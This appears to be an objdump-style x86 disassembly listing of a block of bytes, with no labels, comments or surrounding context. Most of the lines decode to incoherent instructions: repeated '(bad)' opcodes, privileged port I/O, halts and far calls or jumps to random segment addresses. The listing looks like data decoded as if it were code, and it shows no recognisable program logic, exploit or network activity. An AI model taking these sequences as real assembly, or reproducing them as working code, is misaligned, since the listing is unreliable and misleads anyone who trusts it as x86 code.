  4273cc:	push   edx
  4273cd:	ja     0x42744c
  4273cf:	xchg   ecx,eax
  4273d0:	xchg   edx,eax
  4273d1:	call   0x2fcbbc4d
  4273d6:	(bad)  
  4273d7:	jbe    0x42737f
  4273d9:	fistp  QWORD PTR [ebp-0x1a1c6cc0]
  4273df:	mov    ebp,DWORD PTR gs:[edi+0x5b16]
	...
  4273ee:	add    BYTE PTR [eax],al
  4273f0:	add    BYTE PTR [edi+eax*2],cl
  4273f3:	inc    ebx
  4273f4:	xchg   esp,eax
  4273f5:	dec    ebx
  4273f6:	xchg   esp,eax
  4273f7:	(bad)  
  4273f9:	mov    eax,0xc819f609
  4273fe:	shl    BYTE PTR [esi],0x70
  427401:	int    0xe9
  427403:	add    DWORD PTR [eax],eax
  427405:	stos   DWORD PTR es:[edi],eax
  427406:	add    eax,DWORD PTR [eax]
  427408:	add    BYTE PTR [edi-0x15c68cd],bh
  42740e:	fs in  eax,0x57
  427411:	(bad)  
  427412:	neg    DWORD PTR [edi-0x70dba3fe]
  427418:	popa   
  427419:	stc    
  42741a:	inc    ebx
  42741b:	mov    ecx,0xe7577777
  427420:	mov    esi,0xfd33413c
  427425:	sub    BYTE PTR [edi],0xb0
  427428:	int    0xe7
  42742a:	lock and al,0x29
  42742d:	or     eax,0x639399bb
  427432:	mov    dl,0x1f
  427434:	popa   
  427435:	retf   
  427436:	cmp    al,0x7d
  427438:	push   edx
  427439:	mov    esi,DWORD PTR [ecx+0x30]
  42743c:	retf   0xc3a1
  42743f:	in     al,dx
  427440:	rcl    BYTE PTR [eax+ecx*1],cl
  427443:	adc    BYTE PTR [esi+0x2d],dl
  427446:	lea    esi,ds:0xd45343f1
  42744c:	fstp   TBYTE PTR [ebx]
  42744e:	jae    0x427445
  427450:	push   0xffffffda
  427452:	xchg   ebx,eax
  427453:	push   0x45
  427455:	jmp    0x42746d
  427457:	bndstx [eax+0x47b4ec11],(bad)
  42745e:	les    edi,FWORD PTR [eax+0x5]
  427461:	mov    edx,0x2d435fe6
  427466:	xchg   ecx,eax
  427467:	hlt    
  427468:	gs mov edi,0xcae9eb40
  42746e:	stc    
  42746f:	in     eax,0x13
  427471:	push   0xba86d0f1
  427476:	adc    eax,DWORD PTR [ecx+0x29]
  427479:	xor    al,0x5f
  42747b:	setne  BYTE PTR [edx]
  42747e:	sbb    BYTE PTR [esi+0x5639071d],0x74
  427485:	icebp  
  427486:	out    0x64,al
  427488:	out    0xf9,al
  42748a:	cld    
  42748b:	into   
  42748c:	aaa    
  42748d:	out    0xbf,al
  42748f:	loop   0x4274db
  427491:	addr16 mov al,0x16
  427494:	push   ecx
  427495:	jbe    0x427458
  427497:	add    edx,DWORD PTR [ebp+edx*1+0x6f]
  42749b:	mov    DWORD PTR [ecx],edi
  42749d:	cmp    esi,esp
  42749f:	std    
  4274a0:	and    DWORD PTR [esi+0x4f],edi
  4274a3:	dec    edx
  4274a4:	pushf  
  4274a5:	(bad)  
  4274a6:	int3   
  4274a7:	adc    eax,DWORD PTR ds:0x28a8d0a8
  4274ad:	push   0x76
  4274af:	mov    bl,0x37
  4274b1:	push   ebp
  4274b2:	add    cl,BYTE PTR [ebp-0x2a]
  4274b5:	mov    ds:0xd77f313d,al
  4274ba:	jmp    0x10ff:0x8417bfef
  4274c1:	and    ah,cl
  4274c3:	adc    BYTE PTR [ebx+0x1c],0x86
  4274c7:	cld    
  4274c8:	jge    0x4274da
  4274ca:	into   
  4274cb:	sbb    bh,ch
  4274cd:	add    BYTE PTR [edi],dh
  4274cf:	push   eax
  4274d0:	dec    ebp
  4274d1:	mov    dl,0x2f
  4274d3:	jne    0x42745e
  4274d5:	retf   0x8d57
  4274d8:	addr16 nop
  4274da:	adc    al,bh
  4274dc:	ins    BYTE PTR es:[edi],dx
  4274dd:	mov    ebp,0x637bd6ad
  4274e2:	lds    ebp,FWORD PTR [eax]
  4274e4:	mov    esp,0x8bf0e091
  4274e9:	fild   QWORD PTR [eax-0x28]
  4274ec:	cwde   
  4274ed:	push   eax
  4274ee:	test   eax,0xc86be3e4
  4274f3:	clc    
  4274f4:	in     eax,0x87
  4274f6:	fisubr WORD PTR [eax+eax*4-0x53]
  4274fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274fb:	loope  0x42748d
  4274fd:	ja     0x427489
  4274ff:	call   0x2896:0xa7ac6e95
  427506:	cld    
  427507:	pop    ss
  427508:	push   cs
  427509:	sub    al,0xa5
  42750b:	pop    esi
  42750c:	cdq    
  42750d:	test   al,0xb0
  42750f:	in     al,0x6f
  427511:	and    al,0x0
  427513:	jnp    0x427509
  427515:	into   
  427516:	mov    eax,0x32ec3438
  42751b:	aas    
  42751c:	pop    es
  42751d:	and    eax,ebx
  42751f:	inc    DWORD PTR [edx]
  427521:	pop    ecx
  427522:	dec    si
  427524:	cmp    al,0x6f
  427526:	mov    fs,eax
  427528:	int3   
  427529:	push   ebx
  42752a:	nop
  42752b:	(bad)  
  42752c:	ins    BYTE PTR es:[edi],dx
  42752d:	add    eax,edi
  42752f:	cwde   
  427530:	hlt    
  427531:	imul   BYTE PTR [ecx-0x60977adf]
  427537:	cld    
  427538:	shl    DWORD PTR [esi-0x6065304a],0x27
  42753f:	jp     0x4274c2
  427541:	mov    dl,0x4d
  427543:	mov    esi,0xd8e750ae
  427548:	out    dx,al
  427549:	sub    dl,BYTE PTR [esi-0x7713e8f6]
  42754f:	mov    ebp,0x72e9b82d
  427554:	rol    DWORD PTR [edx-0x73d129fd],1
  42755a:	xor    ebx,DWORD PTR [ebx]
  42755c:	ja     0x4274fd
  42755e:	das    
  42755f:	fidivr WORD PTR [edx+0x378b9af2]
  427565:	jns    0x42750e
  427567:	cmp    ebx,esi
  427569:	sbb    BYTE PTR [edi+edx*1],ah
  42756c:	pop    sp
  42756e:	(bad)  
  42756f:	out    dx,al
  427570:	dec    eax
  427571:	mov    edi,0xa9f51b99
  427576:	int    0x6d
  427578:	pop    esi
  427579:	leave  
  42757a:	xchg   ebx,eax
  42757b:	pop    eax
  42757c:	retf   
  42757d:	mov    ebx,0xb402d915
  427582:	mov    BYTE PTR [eax-0x73],0x87
  427586:	outs   dx,DWORD PTR ds:[esi]
  427587:	in     al,0x7b
  427589:	icebp  
  42758a:	and    al,0xa2
  42758c:	mov    ds:0xc73280b3,al
  427591:	(bad)  
  427592:	xchg   esp,eax
  427593:	loop   0x427576
  427595:	pop    es
  427596:	adc    eax,0x1f72433a
  42759b:	push   0xffffffc9
  42759d:	mov    dl,0x17
  42759f:	test   al,0x53
  4275a1:	(bad)  
  4275a2:	and    al,0xf7
  4275a4:	(bad)  
  4275a5:	mov    edx,0xcc26a97f
  4275aa:	adc    DWORD PTR [ecx+0x3e],ecx
  4275ad:	scas   eax,DWORD PTR es:[edi]
  4275ae:	mov    ch,0xc2
  4275b0:	out    0x7a,al
  4275b2:	mov    ds:0xc77afab2,al
  4275b7:	pop    eax
  4275b8:	cmp    ch,BYTE PTR ds:0x82d17b18
  4275be:	repz fidivr DWORD PTR [edx+0x762b1f66]
  4275c5:	stos   BYTE PTR es:[edi],al
  4275c6:	test   BYTE PTR [ecx-0x15],dl
  4275c9:	pop    eax
  4275ca:	aad    0xbc
  4275cc:	adc    DWORD PTR [edx],ebx
  4275ce:	sti    
  4275cf:	(bad)  
  4275d0:	fucomip st,st(2)
  4275d2:	daa    
  4275d3:	and    dh,BYTE PTR [eiz*1-0x7a5b9473]
  4275da:	mov    al,0xf
  4275dc:	jnp    0x427594
  4275de:	ins    DWORD PTR es:[edi],dx
  4275df:	stos   DWORD PTR es:[edi],eax
  4275e0:	mov    eax,ds:0xafc2263b
  4275e5:	cli    
  4275e6:	jle    0x427596
  4275e8:	sbb    BYTE PTR [ecx+0x3],0xc8
  4275ec:	rcr    ebp,0x65
  4275ef:	nop
  4275f0:	mov    dl,0x98
  4275f2:	jp     0x427580
  4275f4:	loop   0x42761a
  4275f6:	xchg   edi,eax
  4275f7:	mov    bl,0xb8
  4275f9:	and    DWORD PTR [ecx-0x5a],esi
  4275fc:	mov    cl,0xc5
  4275fe:	repnz mov al,ds:0x2c035a0e
  427604:	push   edi
  427605:	sbb    bh,ah
  427607:	push   cs
  427608:	shl    edx,cl
  42760a:	adc    BYTE PTR ss:[edx],al
  42760d:	inc    esp
  42760e:	or     eax,0x90786da3
  427613:	sub    eax,edx
  427615:	std    
  427616:	sbb    ecx,DWORD PTR [edx-0x4a]
  427619:	dec    edx
  42761a:	xchg   edx,eax
  42761b:	out    0xe4,eax
  42761d:	or     eax,0x3b6f70b1
  427622:	lock adc edi,esi
  427625:	pop    ds
  427626:	cmp    al,0x63
  427628:	adc    eax,0xce7f7358
  42762d:	cmp    dh,BYTE PTR cs:[edi+0x2b]
  427631:	cli    
  427632:	pop    ebp
  427633:	fdiv   QWORD PTR [ebx+0x7]
  427636:	add    ah,BYTE PTR ds:0x52eef473
  42763c:	call   0x7acfd493
  427641:	shl    edi,0x3a
  427644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427645:	imul   BYTE PTR [esi-0x7c]
  427648:	sti    
  427649:	sbb    edi,DWORD PTR [ecx+0x3a]
  42764c:	sbb    DWORD PTR [ecx],0x38467b5c
  427652:	jnp    0x42763c
  427654:	inc    BYTE PTR [eax+0x27]
  427657:	aad    0xfe
  427659:	dec    ebx
  42765a:	aas    
  42765b:	ret    0x9db8
  42765e:	ins    BYTE PTR es:[edi],dx
  42765f:	aad    0x35
  427661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427662:	jecxz  0x427670
  427664:	sti    
  427665:	pop    eax
  427666:	xchg   BYTE PTR [eax+esi*8+0x30],cl
  42766a:	inc    ecx
  42766b:	pop    ds
  42766c:	xor    al,0xd5
  42766e:	xchg   edi,eax
  42766f:	push   ds
  427670:	xchg   BYTE PTR [ebp-0x37bdcfc3],dl
  427676:	mov    ch,0x80
  427678:	adc    si,WORD PTR [edi-0x6709412]
  42767f:	push   ebx
  427680:	out    0xbe,eax
  427682:	imul   edx,DWORD PTR [ebp-0x32],0x24e30287
  427689:	pushf  
  42768a:	mov    dh,0xfb
  42768c:	cs hlt 
  42768e:	lahf   
  42768f:	cmp    bh,BYTE PTR [ebp+0x6e]
  427692:	icebp  
  427693:	pop    edx
  427694:	retf   
  427695:	cmp    al,0xc2
  427697:	adc    dl,bh
  427699:	std    
  42769a:	jbe    0x427711
  42769c:	shl    edx,cl
  42769e:	loope  0x4276bf
  4276a0:	sbb    BYTE PTR [esi],ah
  4276a2:	dec    edx
  4276a3:	ins    DWORD PTR es:[edi],dx
  4276a4:	inc    ecx
  4276a5:	push   esi
  4276a6:	bound  edi,QWORD PTR [ecx]
  4276a8:	sbb    eax,0x9556a804
  4276ad:	xchg   DWORD PTR [ecx],esi
  4276af:	daa    
  4276b0:	fwait
  4276b1:	mov    ah,0x30
  4276b3:	pop    edx
  4276b4:	iret   
  4276b5:	pop    edi
  4276b6:	dec    esi
  4276b7:	jmp    0x7a73:0x2eb77dd9
  4276be:	out    dx,al
  4276bf:	ret    0x220
  4276c2:	mov    BYTE PTR [ebx+0x38763efc],dl
  4276c8:	mul    DWORD PTR [esi-0x7a21ad9e]
  4276ce:	lock adc eax,0xe49eebf8
  4276d4:	or     al,0x52
  4276d6:	leave  
  4276d7:	mov    bh,0x22
  4276d9:	push   ebp
  4276da:	(bad)  
  4276db:	jecxz  0x42771a
  4276dd:	and    ebp,0xfffffff2
  4276e0:	push   es
  4276e1:	mov    eax,0x59531349
  4276e6:	jl     0x4276ce
  4276e8:	mov    ch,0x50
  4276ea:	ss inc edx
  4276ec:	pop    ebp
  4276ed:	(bad)  
  4276ee:	aam    0xb4
  4276f0:	int    0xa4
  4276f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276f3:	pop    ecx
  4276f4:	jg     0x4276b4
  4276f6:	dec    esp
  4276f7:	mov    al,ds:0x174949fe
  4276fc:	bound  ebx,QWORD PTR [edi-0x6e50ce1e]
  427702:	push   esi
  427703:	aad    0x35
  427705:	cmp    esi,DWORD PTR [edi+0x70e6570]
  42770b:	or     eax,0xfc3f8508
  427710:	sbb    BYTE PTR [ecx+0x6234e5f1],bh
  427716:	pop    edx
  427717:	pop    ecx
  427718:	mov    bh,0xe
  42771a:	or     eax,0x98c5a57f
  42771f:	(bad)  
  427720:	imul   esp,DWORD PTR [ebx+0x6d7e9284],0xffffffab
  427727:	adc    al,0x48
  427729:	lods   eax,DWORD PTR ds:[esi]
  42772a:	mov    ecx,0xfd919a46
  42772f:	cmp    esp,0xeb173cae
  427735:	xchg   BYTE PTR [eax+0x1e],ah
  427738:	mov    dl,0xc6
  42773a:	stc    
  42773b:	out    0x49,eax
  42773d:	adc    eax,0xd2c21ec6
  427742:	fnstsw WORD PTR [eax-0x67796016]
  427748:	jmp    0x42777e
  42774a:	cmp    al,0xeb
  42774c:	ins    BYTE PTR es:[edi],dx
  42774d:	icebp  
  42774e:	dec    ebx
  42774f:	cs in  eax,0xae
  427752:	fsubr  st(5),st
  427754:	jbe    0x427724
  427756:	jne    0x4276de
  427758:	jmp    0x3c92:0x2a5dd650
  42775f:	inc    edx
  427760:	(bad)  
  427761:	fimul  WORD PTR [ecx]
  427763:	icebp  
  427764:	leave  
  427765:	sbb    BYTE PTR [esi-0x2194a54b],bh
  42776b:	cmp    BYTE PTR [edx],0x54
  42776e:	jmp    0x6fc5:0x2f949e6d
  427775:	fstp   TBYTE PTR [edx]
  427777:	fld    DWORD PTR [edx+0x6d46361e]
  42777d:	push   es
  42777e:	fst    DWORD PTR [esi-0x32dcd1a6]
  427784:	lea    esi,[ecx]
  427786:	sbb    ch,BYTE PTR [esi-0x2ef5fb9e]
  42778c:	and    al,BYTE PTR [ebp-0x4714ffbc]
  427792:	fst    DWORD PTR [ebp+edx*1-0x59]
  427796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427797:	inc    ebx
  427798:	xchg   edx,eax
  427799:	adc    ebp,esi
  42779b:	jbe    0x42772e
  42779d:	add    BYTE PTR [edx+0x67855189],ah
  4277a3:	stos   DWORD PTR es:[edi],eax
  4277a4:	aaa    
  4277a5:	out    0xa1,al
  4277a7:	xor    al,0x1f
  4277a9:	pusha  
  4277aa:	into   
  4277ab:	daa    
  4277ac:	push   edi
  4277ad:	shr    ch,0x10
  4277b0:	jge    0x42782b
  4277b2:	mov    esp,0x29
	...
  4277bf:	add    BYTE PTR [eax],al
  4277c1:	sub    al,0x44
  4277c3:	and    edi,DWORD PTR [eax+0x6b]
  4277c6:	jg     0x427847
  4277c8:	push   esp
  4277c9:	adc    edi,DWORD PTR [ebp-0x298b5d8a]
  4277cf:	pop    es
  4277d0:	mov    ebp,0x1ed78
  4277d5:	stos   DWORD PTR es:[edi],eax
  4277d6:	add    eax,DWORD PTR [eax]
  4277d8:	add    BYTE PTR [edx+0xb],cl
  4277db:	dec    ecx
  4277dc:	dec    ebp
  4277dd:	mov    dh,0x47
  4277df:	dec    edi
  4277e0:	adc    cl,BYTE PTR [ebx-0x3a67cff2]
  4277e6:	and    eax,0x61e9dee3
  4277eb:	dec    ecx
  4277ec:	mov    ch,0x50
  4277ee:	rcr    BYTE PTR [edx-0x41],cl
  4277f1:	ret    0x6be6
  4277f4:	test   al,0x74
  4277f6:	and    al,0xf8
  4277f8:	jecxz  0x4277fe
  4277fa:	out    dx,al
  4277fb:	mov    bl,ch
  4277fd:	dec    esi
  4277fe:	push   es
  4277ff:	push   0x27a19b8
  427804:	push   es
  427805:	ds (bad) 
  427807:	aas    
  427808:	xchg   ecx,eax
  427809:	(bad)  
  42780a:	mov    bh,0xa
  42780c:	xchg   esi,eax
  42780d:	dec    esp
  42780e:	add    dl,BYTE PTR [eax]
  427810:	stos   DWORD PTR es:[edi],eax
  427811:	(bad)  
  427812:	mov    esp,0xb5029806
  427817:	rcr    DWORD PTR [ecx-0x5],cl
  42781a:	and    esi,DWORD PTR [edx+0x27f6e309]
  427820:	cli    
  427821:	xor    ch,bl
  427823:	dec    eax
  427824:	mov    cl,0x97
  427826:	and    eax,0x734035d
  42782b:	inc    ebx
  42782c:	xchg   edx,eax
  42782d:	pusha  
  42782e:	or     DWORD PTR [ebx],0x81252a8a
  427834:	cmp    eax,0x54dcca9a
  427839:	cmp    ah,BYTE PTR ds:0x8419ff49
  42783f:	fld    QWORD PTR [ebx]
  427841:	test   al,0x9a
  427843:	test   al,0x6d
  427845:	ins    DWORD PTR es:[edi],dx
  427846:	pop    edi
  427847:	mov    ebp,0x154b20bc
  42784c:	out    0x15,al
  42784e:	je     0x4278bd
  427850:	call   0xa0dd:0x8a8fc58a
  427857:	xchg   ebp,eax
  427858:	pop    ebx
  427859:	loope  0x427802
  42785b:	or     eax,0x9059ab2a
  427860:	repnz call 0x44fa:0x687cb5d2
  427868:	int    0x61
  42786a:	xchg   ebp,eax
  42786b:	xor    al,0xf3
  42786d:	mov    ch,0xd0
  42786f:	fld    TBYTE PTR [ebp-0x7c]
  427872:	std    
  427873:	xor    al,0x57
  427875:	outs   dx,BYTE PTR ds:[esi]
  427876:	sbb    ecx,ebp
  427878:	scas   eax,DWORD PTR es:[edi]
  427879:	xor    ecx,DWORD PTR [ebp-0x38]
  42787c:	pop    ebx
  42787d:	xor    BYTE PTR [edx+ecx*8-0x2935cc82],dl
  427884:	mov    edx,0xd57833b7
  427889:	sbb    BYTE PTR [ecx+eiz*2-0x5d666fe],ah
  427890:	mov    dh,0x56
  427892:	je     0x427891
  427894:	jne    0x4278e6
  427896:	pop    ds
  427897:	mov    edx,0xbbc4c90d
  42789c:	int3   
  42789d:	sbb    al,0xd7
  42789f:	test   eax,0x6d2052f3
  4278a4:	xchg   al,bh
  4278a6:	xor    eax,0x5c3b988e
  4278ab:	mov    DWORD PTR [ebp+0x2d4318a2],ebp
  4278b1:	push   edx
  4278b2:	mov    edi,0xf9cb833f
  4278b7:	out    0x10,eax
  4278b9:	mov    ds:0xc3c0f6c6,al
  4278be:	sub    BYTE PTR [ebp+0x1f],cl
  4278c1:	jg     0x427872
  4278c3:	jg     0x42791d
  4278c5:	out    0x14,al
  4278c7:	xchg   edx,eax
  4278c8:	inc    esp
  4278c9:	pop    ecx
  4278ca:	ja     0x42791c
  4278cc:	dec    ebp
  4278cd:	test   DWORD PTR [eax+0x5886e9de],ecx
  4278d3:	jbe    0x4278c5
  4278d5:	ins    BYTE PTR es:[edi],dx
  4278d6:	mov    ebp,0x60492167
  4278db:	mov    ebx,0x30fc2f53
  4278e0:	add    ebx,ebp
  4278e2:	imul   DWORD PTR [ecx-0x2ddb21d1]
  4278e8:	dec    ecx
  4278e9:	xor    cl,bh
  4278eb:	and    BYTE PTR ds:0x1de37d43,ch
  4278f1:	adc    al,0x29
  4278f3:	dec    eax
  4278f4:	add    bl,al
  4278f6:	repnz sub ah,cl
  4278f9:	fdivr  DWORD PTR [esi-0x72ee4363]
  4278ff:	mov    bh,0x8c
  427901:	mov    DWORD PTR [ebx],ecx
  427903:	or     ecx,eax
  427905:	sbb    edx,DWORD PTR [ebp-0x7e]
  427908:	inc    edi
  427909:	cli    
  42790a:	pusha  
  42790b:	mov    al,ch
  42790d:	ins    DWORD PTR es:[edi],dx
  42790e:	dec    esi
  42790f:	jecxz  0x42798a
  427911:	add    ch,BYTE PTR [ebx+0x28]
  427914:	arpl   WORD PTR [ebx+0x275509ea],dx
  42791a:	in     eax,0x4b
  42791c:	call   0xcb38:0xf68a0727
  427923:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427924:	adc    BYTE PTR [ebx],bl
  427926:	adc    DWORD PTR [esi+0x74ccd110],eax
  42792c:	imul   edi,DWORD PTR [ebp*2-0x7ad4d0ca],0xffffffa9
  427934:	push   esi
  427935:	dec    ebp
  427936:	(bad)
  42793a:	cbw    
  42793c:	mov    bh,0x3a
  42793e:	call   0x37ca:0xea4b3c3
  427945:	or     ch,BYTE PTR [edi+0x562960fb]
  42794b:	rcl    DWORD PTR ds:0xd3d7265d,cl
  427951:	or     al,0xaf
  427953:	jl     0x427965
  427955:	leave  
  427956:	(bad)  
  427958:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427959:	ficomp DWORD PTR [edi]
  42795b:	lds    eax,FWORD PTR [edx+0x5e]
  42795e:	or     esi,edi
  427960:	adc    dh,BYTE PTR [eax+0x67]
  427963:	hlt    
  427964:	lea    edx,[esi+ebx*8+0x53cc0e32]
  42796b:	and    bl,BYTE PTR [eax]
  42796d:	mov    fs,WORD PTR [edi+ebp*8]
  427970:	xchg   DWORD PTR [ebp+0x50],eax
  427973:	and    BYTE PTR [edi-0x5321aaf5],dl
  427979:	imul   eax,DWORD PTR [edx-0x7e],0xfffffffa
  42797d:	inc    ebx
  42797e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42797f:	dec    ebp
  427980:	sub    al,0x8a
  427982:	loop   0x42791c
  427984:	mov    BYTE PTR [edi],ah
  427986:	inc    esi
  427987:	ins    BYTE PTR es:[edi],dx
  427988:	js     0x427931
  42798a:	cmp    DWORD PTR [eax-0x6436e2de],edx
  427990:	jp     0x427917
  427992:	fstp   TBYTE PTR [edi+ebp*8]
  427995:	mov    DWORD PTR [ecx-0x763bd8c7],edi
  42799b:	loopne 0x427948
  42799d:	popa   
  42799e:	outs   dx,BYTE PTR ds:[esi]
  42799f:	test   ch,0x92
  4279a2:	xchg   esi,eax
  4279a3:	cld    
  4279a4:	add    BYTE PTR [edi-0x7a9d8bc0],cl
  4279aa:	jle    0x4279b9
  4279ac:	mov    dh,0x9f
  4279ae:	adc    al,BYTE PTR [ebp*1+0x146740da]
  4279b5:	pop    ss
  4279b6:	call   0x5e4d:0x5483c7b5
  4279bd:	jo     0x427a39
  4279bf:	mov    edx,DWORD PTR [ecx+0x6e]
  4279c2:	stc    
  4279c3:	je     0x427a05
  4279c5:	xchg   ecx,eax
  4279c6:	div    BYTE PTR [ebx]
  4279c8:	ja     0x4279c7
  4279ca:	sbb    ah,BYTE PTR [ecx]
  4279cc:	mov    eax,ds:0xee59eb10
  4279d1:	mov    dl,0x63
  4279d3:	pop    eax
  4279d4:	aam    0xba
  4279d6:	ins    DWORD PTR es:[edi],dx
  4279d7:	jmp    0x421d:0x31f3811e
  4279de:	es loop 0x4279c1
  4279e1:	mov    cl,ch
  4279e3:	add    DWORD PTR [ecx+0x18],0x76
  4279e7:	and    DWORD PTR [edi+0xe32ad42],esp
  4279ed:	fistp  QWORD PTR [esi+0x558a96c5]
  4279f3:	in     ax,dx
  4279f5:	int    0x20
  4279f7:	fistp  WORD PTR [edi+0x2f]
  4279fa:	jno    0x427a3e
  4279fc:	mov    al,BYTE PTR [ecx+0x1399c90c]
  427a02:	out    0xe6,al
  427a04:	(bad)  
  427a05:	sti    
  427a06:	cmc    
  427a07:	call   0xa41d:0x66e5ed92
  427a0e:	leave  
  427a0f:	leave  
  427a10:	je     0x4279cb
  427a12:	pop    edx
  427a13:	inc    ecx
  427a14:	dec    esi
  427a15:	enter  0xf51d,0xf8
  427a19:	into   
  427a1a:	mov    eax,ds:0xe6bdba51
  427a1f:	pusha  
  427a20:	adc    ch,BYTE PTR [eax]
  427a22:	jle    0x427a0f
  427a24:	sub    ecx,DWORD PTR [ebx+0x15]
  427a27:	jmp    0x427a48
  427a29:	dec    ebx
  427a2a:	mov    dh,0xa0
  427a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427a2d:	stos   DWORD PTR es:[edi],eax
  427a2e:	pushf  
  427a2f:	adc    dh,BYTE PTR [ecx+0x36]
  427a32:	and    cl,BYTE PTR [esi+0x19]
  427a35:	(bad)  
  427a36:	pusha  
  427a37:	mov    es,WORD PTR [ecx+0x4693ede3]
  427a3d:	mov    esi,0x8315fbd5
  427a42:	pop    ds
  427a43:	mov    edi,0xf4c7a5e
  427a48:	pop    es
  427a49:	daa    
  427a4a:	jb     0x427a86
  427a4c:	hlt    
  427a4d:	fld    DWORD PTR ds:[ebp+ebx*2+0xd6ac5b9]
  427a55:	das    
  427a56:	adc    bl,al
  427a58:	stos   BYTE PTR es:[edi],al
  427a59:	jg     0x4279f6
  427a5b:	mov    bh,0x84
  427a5d:	pusha  
  427a5e:	adc    ch,dl
  427a60:	aas    
  427a61:	mul    bh
  427a63:	and    al,0x60
  427a65:	shr    eax,0xad
  427a68:	sti    
  427a69:	pop    eax
  427a6a:	aad    0xd0
  427a6c:	in     eax,dx
  427a6d:	(bad)  
  427a6f:	imul   ebx,eax,0xa39265cc
  427a75:	(bad)  
  427a76:	ss push ebx
  427a78:	arpl   si,cx
  427a7a:	mov    gs,esp
  427a7c:	sbb    al,0x55
  427a7e:	push   cs
  427a7f:	push   eax
  427a80:	add    edx,DWORD PTR [ebx-0x15]
  427a83:	sub    ch,dl
  427a85:	pop    edx
  427a86:	jmp    0xa0d82804
  427a8b:	pop    esp
  427a8c:	mov    dh,0xed
  427a8e:	cmp    esi,ebp
  427a90:	fnsave [bp-0x1]
  427a94:	add    DWORD PTR [eax],ecx
  427a96:	cmp    al,0xaf
  427a98:	jne    0x427a53
  427a9a:	sbb    edx,ecx
  427a9c:	aaa    
  427a9d:	and    eax,0xdeac9b9
  427aa2:	mov    ah,0x15
  427aa4:	retf   0x8093
  427aa7:	xor    eax,0xa6e3b614
  427aac:	mov    eax,0x5494d4b3
  427ab1:	fsubr  st,st(1)
  427ab3:	leave  
  427ab4:	cdq    
  427ab5:	aad    0x16
  427ab7:	jnp    0x427b20
  427ab9:	inc    ebp
  427aba:	shl    BYTE PTR [eax],1
  427abc:	cmp    al,0x3b
  427abe:	xlat   BYTE PTR ds:[ebx]
  427abf:	call   0x53bcd400
  427ac4:	cmp    ebp,DWORD PTR [esi+eax*4]
  427ac7:	xor    eax,0x4003ab25
  427acc:	push   edi
  427acd:	inc    esp
  427ace:	cwde   
  427acf:	cmp    al,0x34
  427ad1:	push   es
  427ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ad3:	popa   
  427ad4:	add    BYTE PTR [eax],al
  427ad6:	jecxz  0x427a9c
  427ad8:	mov    ds:0xcf951b5e,eax
  427add:	pop    eax
  427ade:	stos   BYTE PTR es:[edi],al
  427adf:	scas   eax,DWORD PTR es:[edi]
  427ae0:	pushf  
  427ae1:	out    0x6c,al
  427ae3:	bound  edx,QWORD PTR [ecx]
  427ae5:	shrd   esi,edx,cl
  427ae8:	and    DWORD PTR [edx-0x5e6c7ee1],0x3a6cde1f
  427af2:	aam    0x48
  427af4:	jno    0x427b73
  427af6:	push   eax
  427af7:	retf   0x552b
  427afa:	mov    ebp,0xa41870e4
  427aff:	in     al,dx
  427b00:	pusha  
  427b01:	cmp    dl,al
  427b03:	xor    al,0xaf
  427b05:	outs   dx,DWORD PTR ds:[esi]
  427b06:	fnstcw WORD PTR [ebx]
  427b08:	gs aas 
  427b0a:	loope  0x427ac4
  427b0c:	xchg   esi,eax
  427b0d:	jnp    0x427b28
  427b0f:	out    dx,eax
  427b10:	call   0x8f9d:0xc527e8d2
  427b17:	ins    BYTE PTR es:[edi],dx
  427b18:	cdq    
  427b19:	mov    dl,BYTE PTR [ecx]
  427b1b:	fcomp  DWORD PTR [edi-0x42]
  427b1e:	xchg   ecx,eax
  427b1f:	mov    edi,0xd211c9ea
  427b24:	loopne 0x427b82
  427b26:	mov    dl,0x1b
  427b28:	aad    0x89
  427b2a:	fcmovb st,st(7)
  427b2c:	inc    ebx
  427b2d:	ja     0x427af1
  427b2f:	rcr    BYTE PTR [eax],cl
  427b31:	call   0xba17eb01
  427b36:	int3   
  427b37:	les    ebx,FWORD PTR [ebx+0x26]
  427b3a:	shr    BYTE PTR [esi+eiz*4],cl
  427b3d:	aas    
  427b3e:	push   esp
  427b3f:	outs   dx,DWORD PTR ds:[si]
  427b41:	fs mov al,0xdf
  427b44:	sbb    edx,esi
  427b46:	outs   dx,DWORD PTR ds:[esi]
  427b47:	jmp    0x427b4e
  427b49:	dec    eax
  427b4a:	dec    esi
  427b4b:	stc    
  427b4c:	xchg   edi,eax
  427b4d:	mov    edx,0x50163f06
  427b52:	mov    WORD PTR [esi+eax*8+0x7e],ds
  427b56:	adc    al,0xaa
  427b58:	and    dl,cl
  427b5a:	mov    dh,BYTE PTR [edx-0xc26f90]
  427b60:	add    al,0x60
  427b62:	pop    esp
  427b63:	shl    dh,cl
  427b65:	nop
  427b66:	mov    ds:0x38377561,al
  427b6b:	and    BYTE PTR [ebp+0x4d818ebb],bl
  427b71:	scas   al,BYTE PTR es:[edi]
  427b72:	push   0xe8de567b
  427b77:	push   esi
  427b78:	pop    edx
  427b79:	jae    0x427b3a
  427b7b:	out    0x98,al
  427b7d:	jp     0x427b79
  427b7f:	fcomp  DWORD PTR [edx+0xeaf136]
	...
  427b91:	sub    esp,eax
  427b93:	jnp    0x427bcd
  427b95:	sti    
  427b96:	mov    ebx,0x345ef36b
  427b9b:	aaa    
  427b9c:	mov    DWORD PTR [ecx],edx
  427b9e:	sbb    edx,DWORD PTR [ecx-0x7b]
  427ba1:	and    esi,ecx
  427ba3:	add    DWORD PTR [eax],eax
  427ba5:	stos   DWORD PTR es:[edi],eax
  427ba6:	add    eax,DWORD PTR [eax]
  427ba8:	add    BYTE PTR [ecx+0x1fee78d],bh
  427bae:	fstp   QWORD PTR [ebp+eax*1-0x7]
  427bb2:	in     al,0xd
  427bb4:	xchg   edx,eax
  427bb5:	inc    edi
  427bb6:	pushf  
  427bb7:	out    0x24,eax
  427bb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bba:	adc    al,0x8f
  427bbc:	ins    DWORD PTR es:[edi],dx
